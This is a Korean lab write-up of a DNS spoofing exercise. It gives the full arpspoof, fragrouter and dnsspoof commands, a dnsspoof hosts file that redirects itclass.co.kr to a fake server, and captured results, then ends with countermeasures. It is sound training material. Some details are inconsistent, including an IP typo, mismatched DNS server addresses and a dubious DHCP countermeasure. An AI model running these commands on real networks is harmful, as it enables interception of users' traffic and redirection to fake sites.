# DNS Spoofing 공격 실습

## 개요

- DNS Spoofing은 공격자가 DNS 응답 패킷을 위조하여 사용자가 요청한 도메인을 정상 서버가 아닌 공격자가 원하는 서버로 연결시키는 공격입니다.

- 사용자가 웹 사이트에 접속할 때 일반적인 과정은 다음과 같습니다.
  - 사용자가 도메인을 입력합니다.
  - DNS 서버에 해당 도메인의 IP 주소를 질의합니다.
  - DNS 서버가 IP 주소를 응답합니다.
  - 클라이언트는 해당 IP 주소의 웹 서버에 접속합니다.

- 하지만 DNS Spoofing 공격이 발생하면 공격자가 DNS 응답을 위조하여 사용자가 정상 서버가 아닌 공격자가 만든 서버로 접속하게 됩니다.
---

## DNS Spoofing 공격 조건

- DNS Spoofing 공격이 성공하기 위해서는 다음과 같은 조건이 필요하다.

```
- 공격자는 클라이언트와 동일한 네트워크(Local Network)에 존재해야 합니다.
  로컬 네트워크에 위치한 공격자는 원격 DNS 서버보다 물리적으로 가까운 위치에 있기 때문에
  DNS 서버가 응답을 보내기 전에 클라이언트에게 위조된 DNS Response 패킷을 먼저 보낼 수 있습니다.

- 클라이언트는 먼저 도착한 DNS Response 패킷을 정상 응답으로 인식하게 됩니다.  
  따라서 공격자가 보낸 위조 DNS 응답이 먼저 도착하면  
  클라이언트는 이를 정상 응답으로 판단하고 해당 IP 주소로 접속하게 됩다.  

  이후 실제 DNS 서버에서 도착한 응답 패킷은 이미 처리된 요청이기 때문에 무시됩니다.

- 클라이언트가 DNS Query 패킷을 보내는 것을 공격자가 확인할 수 있어야 합니다.  
  하지만 스위칭 환경에서는 다른 호스트의 패킷을 직접 확인할 수 없기 때문에  
  ARP Spoofing을 통해 MITM 상태를 먼저 만들어야 합니다.
```

---

## DNS Spoofing 실습

### 실습 환경

- DNS Spoofing 공격 실습은 다음과 같은 네트워크 환경에서 진행하였습니다.

| 구분 | IP |
|---|---|
| Windows Client | 192.168.11.7 |
| Fake Web Server | 192.168.11.17 |
| Attacker (Kali) | 192.168.11.36 |
| DNS Server | 203.248.252.2 |

### 공격 과정

- DNS Spoofing 공격을 수행하기 위해 다음과 같은 순서로 진행한다.

```
1. Fake Web Server 구축
2. 정상 사이트 접속 확인
3. dnsspoof 설정 파일 수정
4. ARP Spoofing 수행 (MITM 상태 생성)
5. 패킷 전달 설정
6. DNS Spoofing 실행
7. DNS 응답 확인
8. 웹 접속 결과 확인
```

---

### Fake Web Server 구축 (192.168.11.17)
 
- 먼저 클라이언트가 접속할 공격자의 위조 웹 서버를 준비합니다.  

![01](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/01.png)

---

### 정상 사이트 접속 확인

- 공격 전에 Windows Client에서 정상 사이트 접속 여부를 확인합니다.
```
itclass.co.kr
```

![02](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/02.png)

---

### dnsspoof 설정 파일 수정

- DNS Spoofing 공격을 위해 dnsspoof 설정 파일을 수정합니다.

- 파일 위치
```
/usr/share/dsniff/dnsspoof.hosts
```

- 파일 내용
```
192.168.11.17 itclass.co.kr  
127.0.0.1 ad.*  
127.0.0.1 ads*.*
```

![03](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/03.png)

- 설정 의미
```
itclass.co.kr 도메인 요청이 발생하면  
DNS 응답을 192.168.11.17 로 위조하도록 설정한 것입니다.

itclass.co.kr → 192.168.11.17
```

---

### 패킷 전달 설정

- MITM 상태에서 통신이 정상적으로 유지되도록 패킷 포워딩을 설정합니다.

- 명령어
```
fragrouter -B1
```

![04](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/04.png)

- 의미
```
공격자가 패킷을 가로채면서도  
클라이언트와 서버 간 통신이 끊기지 않도록 패킷을 전달합니다.
```

---

### ARP Spoofing 수행

- 스위칭 환경에서는 클라이언트의 DNS 요청을 직접 볼 수 없습니다.  
따라서 DNS Spoofing 공격을 수행하기 위해 먼저 ARP Spoofing을 이용해 MITM 상태를 만듭니다.

- 명령어
```
arpspoof -i eth0 -t 192.168.11.7 192.168.11.1
```

![05](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/05.png)

- 의미
```
192.168.11.1 (Gateway)의 MAC 주소를 공격자의 MAC 주소로 속여  
클라이언트의 트래픽이 공격자를 통해 전달되도록 만듭니다.
```

#### Windows에서 확인
```
arp -a
```

- 결과
  - 192.168.11.1 → 공격자 MAC
  - 92.168.11.36 → 공격자 MAC

![06](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/06.png)

- Gateway MAC 주소가 공격자 MAC 주소로 변경된 것을 확인할 수 있습니다.

---

### DNS Spoofing 공격 실행

- 다음 명령어로 DNS Spoofing 공격을 시작합니다.
```
dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts
```

![07](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/07.png)

- 실행 결과
```
dnsspoof: listening on eth0  
192.168.11.7.1030 > 8.8.8.8.53: 37088+ A? itclass.co.kr
```

- 의미
```
클라이언트가 DNS 서버에 itclass.co.kr 도메인 질의를 보내는 것을 공격자가 확인한 것입니다.
공격자는 이를 가로채 다음과 같이 DNS 응답을 위조합니다.

itclass.co.kr → 192.168.11.17
```

---

### DNS 응답 확인

- Windows에서 DNS 조회
```
nslookup itclass.co.kr
```

![08](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/08.png)

- 결과
```
Name: itclass.co.kr  
Address: 192.168.11.17

- 정상 DNS 서버의 IP가 아니라 공격자가 설정한 IP 주소로 응답이 변조된 것을 확인할 수 있습니다.
```

---

### 웹 접속 결과

- Windows Client에서 브라우저로 `itclass.co.kr` 접속 시  
정상 사이트가 아니라 공격자가 만든 Fake Web Server 페이지가 표시됩니다.


![09](/KH_Security/모의%20해킹/Spoofing/DNS%20스푸핑/img/09.png)

---

## 실습 시 주의사항

### DNS Cache 초기화

- 클라이언트는 DNS 조회 결과를 캐시에 저장합니다.  
따라서 이전에 조회된 DNS 정보가 캐시에 남아있으면 DNS Spoofing 공격이 정상적으로 동작하지 않을 수 있다.

- 캐시된 DNS 정보를 삭제하기 위해 다음 명령어를 사용한다.
```
ipconfig /flushdns
```

### DNS Spoofing 공격 실패 원인

- DNS Spoofing 공격은 **정상 DNS 서버보다 먼저 DNS 응답을 보내야 성공합니다..**

- 만약 정상 DNS 서버의 응답이 공격자의 위조 DNS 응답보다 먼저 도착하면  
클라이언트는 정상 DNS 응답을 사용하게 되므로 공격은 실패합니다.

- 따라서 DNS Spoofing 공격은 네트워크 환경이나 시스템 성능에 따라 성공 여부가 달라질 수 있습니다.

---

## DNS Spoofing 대응 방안

- DNS Spoofing 공격을 방지하기 위한 주요 방법은 다음과 같습니다.
  - 내부 네트워크에서 운영되는 **로컬 DNS 서버 사용**
  - **DNS 서버 게이트웨이 MAC 주소를 고정(Static ARP)** 하여 ARP Spoofing 방지
  - **DNS 서버를 최신 버전으로 유지**하여 취약점 방지
  - 신뢰할 수 있는 **캐시 DNS 서버 사용**
  - **클라이언트 IP를 DHCP로 동적 할당**하여 공격 환경 감소
